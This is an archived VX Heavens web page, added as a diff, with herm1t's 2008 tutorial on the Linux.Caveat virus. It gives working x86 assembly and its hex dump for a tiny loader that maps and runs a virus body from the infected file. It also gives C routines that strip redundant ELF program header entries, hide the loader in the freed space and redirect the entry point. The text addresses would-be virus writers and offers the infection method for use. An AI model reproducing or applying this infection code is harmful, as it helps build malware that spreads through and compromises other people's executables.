@@ -1,0 +1,134 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title>Caveat virus</title>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-1"/>
+<meta name="description" content=""/>
+<meta name="Keywords" content="virus,virii,herm1t,Linux.Caveat,Program Header Table, Loader"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"8e5c899e48785c3505863c8de2ade66a219d790f-1498755128-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<style type="text/css">body{margin:1em;}h1{margin:0;}</style>
+</head>
+<body>
+<h1>Caveat virus</h1>
+<p>herm1t, 2008-02-27</p>
+<p><a href="index.html">Back to main page</a></p>
+<p>This tutorial explains how to use a small amounts of space within Program Header Table to inject the tiny loader which will allocate the memory for the main virus body, load and execute it. Suppose that we have, say, 64 bytes of unused space inside loadable segment? The loader might be implemented as follows:</p>
+<pre>
+		pusha
+		pushl	$0x00006578
+		pushl	$0x652f666c
+		pushl	$0x65732f63
+		pushl	$0x6f72702f
+		mov	%esp,%ebx
+		sub	%ecx,%ecx
+		push	$5		
+		.byte	0xe9
+		.long	0
+		pop	%eax
+		int	$0x80
+		pushl	$0x55aa55aa	# offset in file &amp; 0xfffff000 (*)
+		push	%eax		# handle
+		push	$1		# flags (MAP_SHARED)
+		push	$5		# prot (PROT_READ|PROT_EXEC)
+		push	$0x1000		# length
+		push	%ecx		# start
+		mov	%esp,%ebx
+		push	$90		# __NR_mmap
+		pop	%eax
+		int	$0x80
+		jmp	*%eax
+</pre>
+<p>The above code would open the "/proc/self/exe" for reading, mmap its tail with read and execute permissions, adjust address returned by mmap and pass control to the virus. <em>NB!</em> There is no error checking on both syscalls. Before returning control to the host program, virus need to clean the stack from loader's local variables and pop saved registers (<code>add $40,%esp / popa</code>). When you receive control you'll have your own address in %eax and handle of the infected file in stack. One might also wish to re-allocate the memory and move there to unmap and close the file there the virus resides, but this isn't really neccessary.</p>
+<p>Compile it with <kbd>as loader.s</kbd> and dump with <kbd>objdump -s -j .text a.out</kbd>:</p>
+<pre>
+0000  60687865 0000686c 662f6568 632f7365 682f7072 6f89e329 c96a05e9 00000000
+0020  58cd8068 aa55aa55 506a016a 05680010 00005189 e36a5a58 cd80ffe0
+</pre>
+<p>Only 60 bytes, surely, you can chop a few bytes more, but this is irrelevant. The virus body should be appended to the file you are going to infect. Note, that the offset of the virus in file should be patched (instruction marked by (*), offset 36 in loader). The file length must be multiple of page size, truncate(2) it before writing virus body. This limitation is due to mmap(2).</p>
+<p>Ok, we have a loader, but where is the promissed space? I think all of you knew what the Program Header Table is. It filled with entries (32 bytes each) which describe the segments of the program. Some of them are deadly important (like PT_LOAD or PT_DYNAMIC) and it's not possible to tell the same about the rest. Let's return to the widely known method of infection called "Additional Code Segment" [1]. The sum and substance of it is a replacement of the unused PHT entry with type PT_NOTE (pointer to .note.ABI-tag section) by PT_LOAD (new segment with virus code). We can remove PT_NOTE completely without any consequences. The introduction of the new segment is a quite noticable change for the experienced user. The interesting thing about PHT is that it is located in the text segment. So, we have 32 spare bytes inside PHT and another 32 bytes in .note.ABI-tag section and will use it for the code itself. We will split the loader into two parts (this is what <code>jmp 0f; 0:</code> in loader for) and put it there.</p>
+<pre><strong>BEFORE</strong>                                        <strong>AFTER</strong>                                                                                      
++======================+&lt;----,                +======================+&lt;----,
+| ELF Header           |     |                | ELF Header           |     |
++ - - - - - - - - - - -+&lt;---,|                + - - - - - - - - - - -+&lt;---,|
+| Program Header Table |    ||                | Program Header Table |    ||
+| PT_PHDR              |----'|                | PT_PHDR              |----'|
+| PT_INTERP            |-,   |                | PT_INTERP            |-,   |
+| PT_LOAD              |-|---'                | PT_LOAD              |-|---'
+| PT_LOAD              |-|-,                  | PT_LOAD              |-|-,
+| PT_DYNAMIC           | | |                  | PT_DYNAMIC           | | |
+| PT_NOTE              |-|-|-,                | PT_GNU_EH_FRAME      | | |  
+| PT_GNU_EH_FRAME      | | | |                | PT_GNU_STACK         | | |  
+| PT_GNU_STACK         | | | | Entry Point -->| Loader (part 1)   jmp|-|-|-,
++----------------------+&lt;' | |                +----------------------+&lt;' | | 
+| .interp              |   | |                | .interp              |   | | 
++----------------------+&lt;--|-'                +----------------------+&lt;--|-'
+| .note.ABI-tag        |   |                  | Loader (part 2)      |   |  
++----------------------+   |                  +----------------------+   |
+|                      |   |                  |                      |   |
+........................   |                  ........................   |
+|                      |   |                  |                      |   |
++----------------------+&lt;----Entry Point      +----------------------+   |
+| .text                |   |                  | .text                |   |
+........................   |                  ........................   |
++======================+&lt;--'                  +======================+&lt;--'
+|                      |                      |                      |
+........................                      ........................                
+</pre>
+<p>This could be done with the following code (victim was already mmaped, mapping - m, length - l, ehdr and phdr pointers filled):</p>
+<pre>
+	uint32_t note, base;
+	for (i = 0; i &lt; ehdr->e_phnum; i++) {
+		if (phdr[i].p_type == PT_LOAD &amp;&amp; phdr[i].p_offset == 0)
+			base = phdr[i].p_vaddr;
+		if (phdr[i].p_type == PT_NOTE) {
+			note = phdr[i].p_offset;
+			if (i != ehdr->e_phnum - 1)
+				memcpy(&amp;phdr[i], &amp;phdr[i + 1],
+					sizeof(Elf32_Phdr) * (ehdr->e_phnum - i - 1));
+			ehdr->e_phnum--;
+			*(uint32_t*)(loader + LOADER_JMP) =
+				note - (ehdr->e_phoff + sizeof(Elf32_Phdr) * ehdr->e_phnum + 32);
+			memcpy(&amp;phdr[ehdr->e_phnum], loader, 32);
+			memcpy(m + note, loader + 32, 32);
+			ehdr->e_entry = base + ((char*)&amp;phdr[ehdr->e_phnum] - (char*)m);
+		}
+	}
+</pre>
+<p>LOADER_JMP is the offset within loader to the argument of jmp linking two parts and is equal to 28.</p>
+<p>There also a lot of other possible places for the loader. Recently, comrade F0g showed me his code and I realized that PT_NOTE is not the only reduntant header. The PT_NOTE was so obvious as a target that I didn't even thought about the others. Shame on me! And thanks to F0g! He is replacing the PT_PHDR entry, I also played a bit and found that PT_GNU_STACK is usually of no use also. So we can put the whole thing to PHT:</p>
+<pre>
+	uint32_t base;	
+	Elf32_Phdr new_phdr[ehdr->e_phnum];
+	int new_phnum = 0;
+	for (i = 0; i &lt; ehdr->e_phnum; i++) {
+		if (phdr[i].p_type == PT_LOAD &amp;&amp; phdr[i].p_offset == 0)
+			base = phdr[i].p_vaddr;		
+		if (phdr[i].p_type == PT_NOTE || phdr[i].p_type == PT_PHDR || phdr[i].p_type == PT_GNU_STACK)
+			continue;
+		memcpy(&amp;new_phdr[new_phnum++], &amp;phdr[i], sizeof(Elf32_Phdr));
+	}
+	if (ehdr->e_phnum - new_phnum > 1) {
+		ehdr->e_phnum = new_phnum;
+		memcpy(phdr, new_phdr, new_phnum * sizeof(Elf32_Phdr));
+		memcpy(&amp;phdr[new_phnum], loader, sizeof(loader));
+		ehdr->e_entry = base + ((char*)&amp;phdr[new_phnum] - (char*)m);
+	}
+</pre>
+<p>Both variants presented above was implemented in the Linux.Caveat virus. There is also the nice side effect with this method - you don't need to set the infection marker, since the PHT entries could be removed only once.</p>
+<p>Let's think what else could be done. One may shift the .interp section down in the file to make the hole in PHT and .note.ABI-tag contiguos. There is also a tiny free spots inside the ELF header and sections padding. Or you could reduce the .hash size [2].</p>
+<p>Comments are welcome. &lt;<a href="/cdn-cgi/l/email-protection#b2dad7c0df83c6f2c4cad7c09cddc0d5"><span class="__cf_email__" data-cfemail="365e53445b074276404e534418594451">[email&#160;protected]</span><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></a>&gt;</p>
+<h2>References</h2>
+<ol>
+<li>Alexander Bartolich, "The ELF Virus Writing HOWTO", 2003</li>
+<li>herm1t, "Hashin' the elves", 2007</li>
+</ol>
+<a href="http://validator.w3.org/check?uri=referer"><img src="http://validator.w3.org/images/valid_icons/valid-xhtml10-blue" alt="Valid XHTML 1.0!" height="31" width="88" border="0"/></a>
+<a href="http://jigsaw.w3.org/css-validator/"><img style="border:0;width:88px;height:31px" src="http://jigsaw.w3.org/css-validator/images/vcss-blue" alt="Valid CSS!"/></a>
+<a href="http://vxer.org/"><img src="vx.gif" alt="VX Heavens" title="VX Heavens" border="0"/></a>
+<script>/* <![CDATA[ */(function(d,s,a,i,j,r,l,m,t){try{l=d.getElementsByTagName('a');t=d.createElement('textarea');for(i=0;l.length-i;i++){try{a=l[i].href;s=a.indexOf('/cdn-cgi/l/email-protection');m=a.length;if(a&&s>-1&&m>28){j=28+s;s='';if(j<m){r='0x'+a.substr(j,2)|0;for(j+=2;j<m&&a.charAt(j)!='X';j+=2)s+='%'+('0'+('0x'+a.substr(j,2)^r).toString(16)).slice(-2);j++;s=decodeURIComponent(s)+a.substr(j,m-j)}t.innerHTML=s.replace(/</g,'&lt;').replace(/\>/g,'&gt;');l[i].href='mailto:'+t.value}}catch(e){}}}catch(e){}})(document);/* ]]> */</script></body>
+</html>
